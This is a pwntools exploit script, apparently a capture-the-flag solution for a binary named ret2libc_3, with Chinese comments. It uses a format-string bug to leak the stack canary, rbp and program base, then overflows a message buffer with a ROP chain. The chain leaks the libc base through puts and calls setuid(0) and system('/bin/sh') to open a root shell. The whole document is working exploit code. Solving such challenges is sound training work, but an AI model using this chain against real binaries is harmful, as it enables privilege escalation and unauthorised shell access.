from pwn import *
# set 
context(arch="amd64", os="linux", log_level="debug")
# excute
challenge_path = "/challenge/ret2libc_3"
elf = ELF(challenge_path)
p = process(challenge_path)
libc= ELF('/challenge/libc.so.6')
# ROPgadget --binary libc.so.6 --string '/bin/sh'
# bin_sh = 0x00000000001b45bd
bin_sh = next(libc.search("/bin/sh"))

# 泄露rbp和程序基址
p.sendafter("Choice >> \n","3\n")
p.sendafter("Input your message:\n","%14$p\n")
p.recvline()
result=p.recvline()
rbp=int(result,16)
sleep(0.5)
p.sendafter("Choice >> \n","3\n")
p.sendafter("Input your message:\n","%15$p\n")
p.recvline()
result=p.recvline()
nextrip_addr=int(result,16)
offset=nextrip_addr-0x1403
# 泄露canary
p.sendafter("Choice >> \n","3\n")
p.sendafter("Input your message:\n","%13$p\n")
p.recvline()
result=p.recvline()
canary=int(result,16)
print("\nCANARY IS:",hex(canary))

# 布置栈帧，padding+canary+rbp
payload = 7 * p64(0x1111111111111111)+ p64(canary) + p64(rbp) 
# ROPgadget --binary /challenge/ret2libc_3 --only "pop|ret" | grep "rdi"
# pop_rdi_ret_addr = next(elf.search(asm('pop rdi;ret'), executable=True)) 
pop_rdi_ret_addr = 0x14c3
payload += p64(pop_rdi_ret_addr + offset)
payload += p64(elf.got['puts']+offset)#加不加+offset
payload += p64(elf.plt['puts']+offset)
payload += p64(0x1357+ offset)
p.sendafter("Choice >> ","3\n")
p.sendafter("Input your message:\n",payload)

p.recvline()
# 获取随机化之后的libc基地址，注意这里要跳过之前打印的无关信息
libc_address = u64(p.recvuntil('\n')[56:-1].ljust(8, b'\x00')) - libc.sym['puts']
# 泄露rbp和程序基址
p.sendafter("Choice >> \n","3\n")
p.sendafter("Input your message:\n","%14$p\n")
p.recvline()
result=p.recvline()
rbp=int(result,16)
# 泄露canary
p.sendafter("Choice >> \n","3\n")
p.sendafter("Input your message:\n","%13$p\n")
p.recvline()
result=p.recvline()
canary=int(result,16)
print("\nCANARY IS:",hex(canary))
# 布置新的栈帧
bin_sh_addr = libc_address + bin_sh
system_addr = libc_address + libc.sym['system']
setuid_addr = libc_address + libc.sym['setuid']
payload2 = 7*p64(0x1111111111111111) + p64(canary) + p64(rbp)  
payload2 += p64(pop_rdi_ret_addr + offset)
payload2 += p64(0)
payload2 += p64(setuid_addr)
payload2 += p64(pop_rdi_ret_addr + offset)
payload2 += p64(bin_sh_addr)
payload2 += p64(system_addr)
p.sendafter("Choice >> ","3\n")
p.sendafter("Input your message:\n",payload2)
# 注意获得shell之后需要进入交互模式，用改了权限的shell读取flag，不然程序终止修改失效
p.interactive()
# python3 /home/hacker/rop6.py
"""
保护全开！！！！！！！！！！！！！！！！！！！！！！！
leave_message中buf大小40h，但是最多可读入100h
canary存放在fs:28h中，被转移到了rbp-8h处，可由格式化漏洞泄露
字符串是rbp-40h，起始为第6个参数，6+38h/8=13,%13$p
那么%14$p是rbp，%15$p是rip，可以得到源程序基地址，但是还需要求libc基址
"""

